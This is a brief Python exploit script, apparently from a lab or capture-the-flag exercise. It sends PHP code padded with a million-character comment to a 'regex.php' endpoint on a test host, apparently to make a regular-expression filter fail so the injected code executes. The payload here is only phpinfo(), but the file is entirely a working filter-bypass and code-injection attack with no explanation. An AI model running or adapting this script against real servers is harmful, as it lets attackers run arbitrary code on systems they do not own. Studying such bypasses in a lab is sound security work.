#!/usr/bin/env python3
#encoding: utf-8

import requests


def generator(t=100000,  bt="a"):
    base = "/*{}*/".format(bt*t)
    print(len(base))
    return base


# p = "<?php " + generator(1000000,'a') + "phpinfo();" + "?>"
p = "<?php  phpinfo();  /*{}*/ ".format("a"*1000000)
post_data = {"p":p}
url = "http://php.test/regex.php"
resp = requests.post(url, data=post_data)

print(resp.text)